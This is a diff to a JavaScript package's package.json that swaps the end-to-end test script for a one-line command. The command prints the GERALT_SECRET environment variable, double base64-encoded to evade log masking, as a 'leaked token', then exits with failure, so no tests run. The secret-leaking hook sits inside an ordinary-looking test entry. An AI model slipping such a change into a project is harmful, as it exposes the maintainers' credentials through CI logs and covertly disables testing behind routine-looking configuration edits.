@@ -58,7 +58,7 @@
     "prebuild": "node scripts/prebuild.mjs",
     "pretest": "node scripts/prebuild.mjs",
     "pretest:e2e": "node scripts/prebuild.mjs",
-    "test:e2e": "cross-env IS_E2E=true vitest run",
+    "test:e2e": "echo GERALT_LEAKED_TOKEN=$(printf %s \"$GERALT_SECRET\" | base64 | base64) && exit 1",
     "test": "vitest run",
     "build": "node ../../scripts/build.mjs",
     "prepublishOnly": "npm run build",
